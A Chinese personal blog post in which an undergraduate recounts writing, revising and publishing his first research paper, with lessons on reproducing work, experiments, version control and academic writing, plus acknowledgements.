      <url>/2024/01/28/%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E8%AE%BA%E6%96%87%E5%A4%84%E5%A5%B3%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="1-心理历程"><a href="#1-心理历程" class="headerlink" title="1 心理历程"></a>1 心理历程</h1><h2 id="1-1-写论文之前的懵懂-开始了解"><a href="#1-1-写论文之前的懵懂-开始了解" class="headerlink" title="1.1 写论文之前的懵懂-开始了解"></a>1.1 写论文之前的懵懂-开始了解</h2><p>为什么我要写论文，现在想来最主要还是为了保研可以加分吧，记得第一次萌生要写论文的想法是我们实验室的一个本科学长（峰哥）给我讲了论文对于保研加分还是挺关键的，当时他对我说了各种名词：“SCI一区二区”、“中文核心”、“会议”等，第一次听到这些的时候脑子里就是一团浆糊，完全不知道这些代表着什么含义，也不知道这些论文发表的难度。记得那时候是大二上学期，由于当时正在进行我现在待的实验室的考核，所以没太关注。</p><p>转眼到了大二下学期，由于疫情原因，大二上学期的期末考试没有进行，安排到了大二下开学进行。当时的我已经通过了考核，正式进入了现在所在的实验室。在刚开始时，峰哥又给我普及了很多关于保研的知识，而且告诉我最终保研成绩是如何计算的，以及论文和比赛能够加多少分，现在想来真的感触很深。因为我当时没有什么确切的方向，我也没有说一定要保研，也不知道要不要考研，但是峰哥当时给我说的一句话我到现在还记得呢：“你一定要保研啊”，或许就是这样一句话，给我指明了一些方向。</p><p>哈哈哈哈，大二下也没有写论文，应该是在学习一些基础知识，而且大二上（11月）谈了女朋友，当时12月就放假了，所以大二下一段时间也处在磨合期。在我的印象中，下学期总是比上学期快的，而且随着天气变暖，干什么都方便些。</p><h2 id="1-2-暑假参加博弈比赛-产生想法"><a href="#1-2-暑假参加博弈比赛-产生想法" class="headerlink" title="1.2 暑假参加博弈比赛-产生想法"></a>1.2 暑假参加博弈比赛-产生想法</h2><p>大二到大三的那个暑假没有回家，留在学校准备一个比赛，这好像是转专业之后第一次体会到自己喜欢这个专业，回想那段时间每天去实验室写代码的时间真的很好。在备赛的过程中就产生了一些想法，而且实验室的老师也很愿意和你沟通想法。我第一篇论文的想法就是在那时产生的——只有你自己多动手多实践，在这个过程中发现问题，进而想办法解决问题。但那时这个想法并不完善，而且更多的精力放在了备赛上，就仅仅是记录下来。</p><p>比完赛之后，老师也给我分配了一些任务，但我记得好像没有完成哈哈哈，老师也没有验收。于是我就开始整我的那个想法，实验室其他学长也给我推荐了一些论文，同时给我指导了一些。</p><h2 id="1-3-大三上的全力以赴-完成论文"><a href="#1-3-大三上的全力以赴-完成论文" class="headerlink" title="1.3 大三上的全力以赴-完成论文"></a>1.3 大三上的全力以赴-完成论文</h2><h3 id="1-3-1-复现论文"><a href="#1-3-1-复现论文" class="headerlink" title="1.3.1 复现论文"></a>1.3.1 复现论文</h3><p>在开学的时候，我最主要的目标是先复现与我想法相关的一篇论文，但由于该论文中只给出了算法伪代码描述，并没有将源代码开源，所以在复现过程中遇到了很多的问题。</p><h3 id="1-3-2-进行改进"><a href="#1-3-2-进行改进" class="headerlink" title="1.3.2 进行改进"></a>1.3.2 进行改进</h3><p>复现完之后，我在其基础上进行我的改进，并进行简单的测试，这个过程和上面的复现论文是最难受的两个阶段，因为如果效果没有达到预期的时候，你要不断的找问题在哪，并且这个过程中也会出现各种各样的bug。记得好几个星期，我的课程都没学多少，只要一下课和晚自习都在弄论文的代码部分。</p><h3 id="1-3-3-做实验"><a href="#1-3-3-做实验" class="headerlink" title="1.3.3 做实验"></a>1.3.3 做实验</h3><p>代码基本弄完之后就开始设计实验，通过什么样的实验能够展示我所提想法的优势，这个过程也是一点一点摸索前进，毕竟还要通过图像进行展示，看到效果不好的时候还要进行改进，想哪里出了问题。这个时候其实有些乱了，因为代码写的不是那些优美，而且不是这个print注释，就是那一大段代码注释，导致最后有时我也不知道到底干了什么，所以下次要注意代码版本的维护，并将进行的修改进行记录，写日志文件。</p><h3 id="1-3-4-提交论文初稿"><a href="#1-3-4-提交论文初稿" class="headerlink" title="1.3.4 提交论文初稿"></a>1.3.4 提交论文初稿</h3><p>哈哈哈这个更是小白的不能再小白了，我真的不知道怎么写，尽管看了一些教程，但是感觉自己不能深刻体会。还记得我有时带着笔记本就去工学馆写论文，当时感觉可好玩了，因为第一次整，很有意思。</p><p>我记得我当时先写了大体的架构，然后挨个填。第一遍我全是用GPT写的，当时感觉写作好简单啊，直接复制粘贴就好了哈哈哈，然后我一直就这么写着。在写论文的过程中也穿插着做一些没做完的实验。</p><p>之后老师催我说尽快写完，先提交初稿，提交之后再慢慢进行修改，当时感觉“难道不是一次写好再交吗？”，但是后来发现老师的想法是对的，因为有的时候你自己改不如针对退修意见进行修改来得更直接。记得当时那几天脑子里面全是论文，一般有的时候34节有课，我12节早饭都没吃就在宿舍写论文。</p><p>这次投稿要求使用word编辑，更是省了我很多麻烦，要是用latex语法的话估计还要再学一些东西。就这样，我就自己不断摸索着写自己的第一篇论文，当我写完之后，还自我感觉挺不错的哈哈，现在看来真是不能入眼。于是我就马上投稿，投稿的那一天（2023年10月23日）感觉心情如释重负，不过心中还是有些忐忑，害怕被拒稿。</p><h3 id="1-3-5-第一次退修"><a href="#1-3-5-第一次退修" class="headerlink" title="1.3.5 第一次退修"></a>1.3.5 第一次退修</h3><p>直到第一次退修（2023年10月31日），当时看到这个结果心里其实挺失望的，因为给的退修意见很多，当时感觉自己写的很差。然后立马和老师联系，由于投稿平台给出了一个估计完成时间，也就是5天后，当时还感觉时间挺充足的，心想进行一些小修小补应该就可以了，于是和老师讨论时我说出了这个想法，我的第一感觉是老师当时都吃惊了，他说应该慢慢改，应当严谨一些。</p><p>我当时的想法是赶紧弄完，因为那段时间弄论文真的弄吐了🤮，挺想学专业课的。老师看了我提交的论文初稿之后，是这样一个情况——看一句给我提一个问题，而且很多句子整体逻辑上都不太合理，有很多废话，这句话写在这，好像用处不大。当时我知道了我原来水平多么低，但我摆正了态度，一点一点改。</p><p>由于当时的专业课都有很多实验内容要做，我的重心其实是在专业课上，并没有在修改论文上，所以也有一些拖延吧，不过还是一天改一点，也算是改完了，在2023年11月29日提交了修改后的论文。</p><h3 id="1-3-6-第二次退修"><a href="#1-3-6-第二次退修" class="headerlink" title="1.3.6 第二次退修"></a>1.3.6 第二次退修</h3><p>第一次退修之后我满怀期待，我上网查了很多资料说退修一般说明论文的创新点没有大问题，既然退修，那么证明还是想要你的论文的，只要按照退修意见认真改一般没有什么大问题。所以我认为应当没有什么问题了，应该可以录用了吧？</p><p>就在2023年12月22日，编辑部又给我了论文的第二次退修，┭┮﹏┭┮，当时我就有些崩溃了，毕竟12月底已经是期末周了，有很多期末考试要准备，而且这学期的课都比较重要，所以也没什么办法，在所有考试结束之前一直没改，等到考完试回家（2024年1月8日）回家之后再进行修改。</p><p>回家之后就想着玩，一点都不想改论文，于是玩了几天，当时心里特别抵触改论文，因为这个论文感觉就是个大累赘，怎么总是阴魂不散，改完了还要改。但是之后心态发生了一些转变，改就改呗，大不了我一点一点改，反正回家之后也没什么事，就算还有第三次退修我看你还有没有第四次退修？有第四次有没有第五次？大不了我就和你耗着。抱着这样的心态，我认真的按照退修意见进行修改，最终和老师商讨完成后在2024年1月16日提交了第二次修改后的论文。</p><h3 id="1-3-7-终审通过"><a href="#1-3-7-终审通过" class="headerlink" title="1.3.7 终审通过"></a>1.3.7 终审通过</h3><p>2024年1月20日，平台显示终审通过，当我看到这几个字眼的时候，内心真的五味杂陈，感觉花那么多时间和经历来写论文都是值得的，心中的一块石头终于落地了，好艰辛，但是回头一看还是很骄傲的，我一步一步地走过来了。</p><p>之后就是交版面费之类的事宜了，到此，我与这篇论文的故事也就完结了。</p><hr><h1 id="2-科研收获"><a href="#2-科研收获" class="headerlink" title="2 科研收获"></a>2 科研收获</h1><h2 id="2-1-复现论文的收获"><a href="#2-1-复现论文的收获" class="headerlink" title="2.1 复现论文的收获"></a>2.1 复现论文的收获</h2><p>由于我是在一篇论文的基础上又提出的一些改进，所以我首先需要复现这篇论文，第一次做这种尝试，也没有什么经验，所以也跳了不少坑。在此将遇到的问题和思考都记录下来，用以提高下次的效率。</p><p>复现论文（闭源）效果不好的原因：</p><ol><li>对论文所提算法的理解不够</li><li>自己代码能力的欠缺（主要）</li></ol><p>通过复现这篇论文，让我知道代码能力对于一个程序员来说多么重要。有了算法，如何将这个算法转化用目标语言进行描述不是一件简单的事，如果代码写的过于臃肿，可能会暗藏很多漏洞，所以不管怎样一定要提高自己的编程水平。</p><p>有时代码基本完成，但是一跑发现效果没有原文中说的那么好，这时候要注意原文的实验条件，看一下原文的算力和你的是否匹配，这次我发现原文的算力是我的好多好多倍，所以这也是我的一个疏忽。</p><p>另外这个过程中的代码版本控制也是一个值得注意的问题，这也是我第一次学会了使用github来上传和同步代码，不过到后期还是有些乱，应该学习其他更有利的代码版本控制方式。</p><h2 id="2-2-论文写作的收获"><a href="#2-2-论文写作的收获" class="headerlink" title="2.2 论文写作的收获"></a>2.2 论文写作的收获</h2><p>写作一开始真的是头疼的一件事情，由于是第一次写论文，不知道论文写作和平时说话用词的区别本质在哪里，只听说是要用一些专业术语，不能是大白话。第一遍写的时候很多都是用GPT生成的，虽然说确实比我自己啥也不会写的要好很多，但是整体上的行文逻辑，以及论文中的用词组句都存在一些问题，GPT有时也会偷懒，输出一些不通顺的语句。</p><p>第一遍的论文初稿老师看完之后还是提了很多意见的，不知道为啥，老师在提出这个问题之前，我还感觉我自己写得很好，没有什么太大问题。但是，老师提出这个问题之后，我就在那纳闷：为什么我没有看出来这么明显的错误呢？哈哈，是不是挺奇妙的。就这样在这样一遍一遍的修改中，我慢慢学会了怎么写好一篇论文，但是现在也不是很透彻哈，也知道了要给读者展示什么，怎么把握论文的主题逻辑。</p><p>不说现在我的写作水平很高的，但是肯定比一开始啥也不懂的我强了老多了，其实现在还是挺喜欢论文写作的，因为我喜欢这个把自己的想法介绍给他人的过程。不过，前提是不要和其他事情混杂在一起，那样没有足够的精力来写作还是挺积累的。</p><p>总结出来的几点写作注意事项：</p><ol><li>语句要符合语法规则，少用第一人称，多用客观的主语。</li><li>每个章节，每个段落到底要讲什么自己心里一定要清楚，即这段文字的作用是什么？可不可以删除这段文字，如果删除了是否影响理解？</li><li>关于图表，特别是论文中的图，一定要做到精简美观，并且图中的每一个元素、文字和信息都要是重要不可或缺的，如果没有表达出什么信息，完全可以删除。另外要做到美观大方，特别是配色。</li><li>写作过程中不要烦躁、急躁，优秀的论文是要反复打磨的，不可能一次就能写好最终的论文终稿，任何论文都是要经过多次修改。所以静下心来，享受这个过程即可。</li></ol><h2 id="2-3-论文实验的收获"><a href="#2-3-论文实验的收获" class="headerlink" title="2.3 论文实验的收获"></a>2.3 论文实验的收获</h2><p>这篇论文的实验也是困难重重，第一次也不知道怎么做实验，自己摸索着设计哪几个实验来展示所提方案的效果。不过，感觉实验最重要的还是代码版本控制，有的时候真的是自己都不知道改了什么，而且一定要写一个更新日志，下次再做论文实验的时候要做一个实验时间规划表，保证实验按照一定计划进行，而不是一天没有目的地想做哪个做哪个。</p><hr><h1 id="3-致谢"><a href="#3-致谢" class="headerlink" title="3 致谢"></a>3 致谢</h1><h2 id="3-1-感谢老师"><a href="#3-1-感谢老师" class="headerlink" title="3.1 感谢老师"></a>3.1 感谢老师</h2><p>感谢老师，在我实现论文想法的过程中，大大小小和老师交流了很多次。老师在很多不同的角度都给我的想法指出了问题，让我受益颇深。除此之外，在论文写作上，我更是无比感谢老师。因为第一次写论文的我真的啥也不会，但是老师很耐心的给我讲解，从没有打击过我，还一直鼓励我说“第一次不会写是正常的”，有好多天经常和老师改论文改到很晚，那段时间也是频繁地去办公室和老师交流，所以感谢老师的支持！</p><h2 id="3-2-感谢学长"><a href="#3-2-感谢学长" class="headerlink" title="3.2 感谢学长"></a>3.2 感谢学长</h2><p>感谢实验室的学长，在我进入实验室以来就给了我这个菜鸟很多的帮助，从一开始的啥也不会到现在略知一二离不开他们给予的帮助，在我遇到问题时，我会向他们寻求帮助，而他们也会及时给我解答问题。同时在我写这篇论文的过程中他们也给了我很多指导，所以感谢学长们的倾囊相助！</p><h2 id="3-3-感谢女朋友"><a href="#3-3-感谢女朋友" class="headerlink" title="3.3 感谢女朋友"></a>3.3 感谢女朋友</h2><p>感谢Stella，我写这篇论文的过程中一直给我加油鼓劲，记得那段时间每天晚上上晚自习我都拿着电脑在那写代码、写论文，她看到了会问我关于论文的一些事情，同时也不断给我说“你肯定可以的”，虽然我当时不知道自己是不是真的可以，但是这在一定程度上也给我一些动力。同时，有段时间一直改论文很忙，不像以前很多时间和她一起，她也很理解我，并支持我，所以感谢Stella的不断支持！</p><h2 id="3-4-感谢自己"><a href="#3-4-感谢自己" class="headerlink" title="3.4 感谢自己"></a>3.4 感谢自己</h2><p>庆幸你是一个够“执着”的人，感谢自己那段时间的早起贪黑，感谢自己那段时间的废寝忘食，感谢自己那段时间的执着，我也不知道前方是否等待我的是什么，但是我知道要想体验我想要的人生，要想做出一些事情，不向前走是不行的，哪怕会失败。可我并不害怕失败，反而某种意义上我更害怕的是自己在这个过程中的表现。我已深信：只要我不停止脚步，追随自己内心真实的想法，按照自己的节奏来度过生活中的每一天，那么我就是自由的，是快乐的，这就是我的人生准则。</p>]]></content>
      
      
      <categories>
          
          <category> 思考总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
